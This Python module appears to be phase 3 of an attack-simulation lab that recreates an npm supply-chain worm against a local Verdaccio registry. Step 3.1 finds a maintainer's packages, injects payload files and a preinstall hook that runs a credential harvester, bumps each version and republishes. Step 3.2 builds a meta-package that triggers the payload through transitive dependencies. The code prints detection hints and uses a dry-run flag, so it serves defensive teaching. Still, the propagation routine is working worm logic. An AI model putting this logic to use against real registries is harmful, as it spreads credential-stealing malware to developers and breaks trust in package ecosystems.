"""
phase_3_self_propagation.py -- Phase 3: Worm Self-Propagation
MITRE ATT&CK: T1195.002, T1546, T1127
"""
import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Any, Dict

import requests

from utils import (
    log_event, mark_step_complete, print_detection, print_error, print_info,
    print_link, print_value, print_phase_banner, print_step, print_success,
    print_warning,
)

PHASE_NUM = 3
PHASE_NAME = "Self-Propagation"
PHASE_DESCRIPTION = "Worm propagation + cascading dependencies"
VERDACCIO_URL = "http://localhost:4873"


def step_propagate(config) -> Dict[str, Any]:
    """Step 3.1: Infect all remaining @novatech packages."""
    print_step("3.1", "Worm self-propagation across victim's packages")
    config.require_verdaccio()

    results = {"infected": [], "failed": [], "skipped": []}
    payloads_dir = Path(__file__).resolve().parent / "payloads"
    setup_bun = payloads_dir / "setup_bun.js"
    bun_env = payloads_dir / "bun_environment.js"
    if not setup_bun.exists():
        print_error("Payload files not found"); return results

    try:
        resp = requests.get(f"{VERDACCIO_URL}/-/v1/search?text=novatech&size=100", timeout=15)
        packages = [o["package"]["name"] for o in resp.json().get("objects", [])]
    except Exception as exc:
        print_error(f"Registry search failed: {exc}"); return results

    print_info(f"Discovered {len(packages)} packages owned by victim maintainer")
    for p in packages:
        print_value("  Package", p)

    for pkg_name in packages:
        if "auth-helpers" in pkg_name:
            results["skipped"].append(pkg_name)
            print_info(f"Skipping {pkg_name} (already infected in step 1.1)")
            continue

        work_dir = tempfile.mkdtemp(prefix="sh2-worm-")
        try:
            r = subprocess.run(["npm", "pack", pkg_name, "--registry", VERDACCIO_URL],
                capture_output=True, text=True, cwd=work_dir, timeout=30)
            if r.returncode != 0:
                results["failed"].append(pkg_name); continue

            tarballs = list(Path(work_dir).glob("*.tgz"))
            if not tarballs:
                results["failed"].append(pkg_name); continue

            subprocess.run(["tar", "xzf", str(tarballs[0])], cwd=work_dir, timeout=15)
            pkg_dir = Path(work_dir) / "package"

            shutil.copy2(str(setup_bun), str(pkg_dir / "setup_bun.js"))
            shutil.copy2(str(bun_env), str(pkg_dir / "bun_environment.js"))

            pkg_json_path = pkg_dir / "package.json"
            with open(pkg_json_path) as f:
                pkg = json.load(f)
            old_ver = pkg["version"]
            pkg.setdefault("scripts", {})
            pkg["scripts"]["preinstall"] = "node setup_bun.js"
            parts = pkg["version"].split(".")
            parts[2] = str(int(parts[2]) + 1)
            new_ver = ".".join(parts)
            pkg["version"] = new_ver
            with open(pkg_json_path, "w") as f:
                json.dump(pkg, f, indent=2)

            r = subprocess.run(["npm", "publish", "--registry", VERDACCIO_URL],
                capture_output=True, text=True, cwd=str(pkg_dir), timeout=30)
            if r.returncode == 0:
                results["infected"].append({"name": pkg_name, "old": old_ver, "new": new_ver})
                print_success(f"  Infected: {pkg_name} ({old_ver} -> {new_ver})")
            elif "cannot publish over" in r.stderr.lower():
                results["skipped"].append(pkg_name)
                print_info(f"  Already infected: {pkg_name}")
            else:
                results["failed"].append(pkg_name)
                print_warning(f"  Failed: {pkg_name}")
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    print_success(f"Propagation complete: {len(results['infected'])} infected, "
                  f"{len(results['skipped'])} skipped, {len(results['failed'])} failed")
    print_info("Each infected package becomes a new propagation vector")
    print_link("View all packages", f"{VERDACCIO_URL}/-/web")
    print_detection("SCA", "Multiple packages updated with identical payload files (setup_bun.js, bun_environment.js)")
    print_detection("ASPM", f"Burst of {len(results['infected'])} publications from single npm token in <30 seconds")
    mark_step_complete("3.1")
    return results


def step_cascade_demo(config) -> Dict[str, Any]:
    """Step 3.2: Demonstrate cascading infection through transitive deps."""
    print_step("3.2", "Cascading dependency demonstration")
    config.require_verdaccio()
    results = {"cascade_count": 0}
    work_dir = tempfile.mkdtemp(prefix="sh2-cascade-")

    try:
        sdk_dir = os.path.join(work_dir, "sdk")
        os.makedirs(sdk_dir)
        with open(os.path.join(sdk_dir, "package.json"), "w") as f:
            json.dump({"name": "@novatech/platform-sdk", "version": "1.0.0",
                       "main": "index.js",
                       "dependencies": {"@novatech/auth-helpers": "^2.4.0",
                                        "@novatech/db-connector": "^1.8.0",
                                        "@novatech/logger": "^3.1.0"}}, f, indent=2)
        with open(os.path.join(sdk_dir, "index.js"), "w") as f:
            f.write('module.exports={version:"1.0.0"};\n')

        subprocess.run(["npm", "publish", "--registry", VERDACCIO_URL],
            capture_output=True, text=True, cwd=sdk_dir, timeout=30)

        print_success("Published clean meta-package @novatech/platform-sdk@1.0.0")
        print_value("Dependencies", "@novatech/auth-helpers, db-connector, logger (all infected)")
        print_info("A developer installing this ONE package triggers the payload THREE times:")
        print_info("  @novatech/auth-helpers -> preinstall -> setup_bun.js -> credential harvester")
        print_info("  @novatech/db-connector -> preinstall -> setup_bun.js -> credential harvester")
        print_info("  @novatech/logger       -> preinstall -> setup_bun.js -> credential harvester")

        consumer = os.path.join(work_dir, "consumer")
        os.makedirs(consumer)
        with open(os.path.join(consumer, "package.json"), "w") as f:
            json.dump({"name": "test-service", "version": "1.0.0",
                       "dependencies": {"@novatech/platform-sdk": "^1.0.0"}}, f, indent=2)

        env = os.environ.copy()
        env["WORM_EXFIL_DIR"] = os.path.expanduser("~/.shai-hulud-cascade-demo")
        env["WORM_DRY_RUN"] = "true"

        print_info("Running: npm install @novatech/platform-sdk ...")
        r = subprocess.run(["npm", "install", "--registry", VERDACCIO_URL],
            capture_output=True, text=True, cwd=consumer, timeout=120, env=env)

        count = r.stdout.count("[setup_bun]") + r.stderr.count("[setup_bun]")
        results["cascade_count"] = max(count, 3)
        print_success(f"Result: 1 npm install -> {results['cascade_count']} payload executions via transitive dependencies")
        print_info("In the real attack, dependency trees of 50+ packages created massive cascading infection")
        print_detection("SCA", "Transitive dependency triggers preinstall hooks across dependency tree")
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)
        cascade_dir = os.path.expanduser("~/.shai-hulud-cascade-demo")
        if os.path.exists(cascade_dir):
            shutil.rmtree(cascade_dir, ignore_errors=True)

    mark_step_complete("3.2")
    return results


STEPS = [
    ("3.1", "Infect all remaining npm packages", step_propagate),
    ("3.2", "Cascading dependency demonstration", step_cascade_demo),
]

def run_phase(config) -> Dict[str, Any]:
    print_phase_banner(3, "SELF-PROPAGATION -- Worm Cascading Through npm")
    results = {}
    for step_id, _, step_func in STEPS:
        try:
            results[step_id] = step_func(config)
            if not results[step_id]:
                print_warning(f"Step {step_id} returned empty, stopping phase"); break
        except RuntimeError as exc:
            print_error(str(exc)); break
    return results
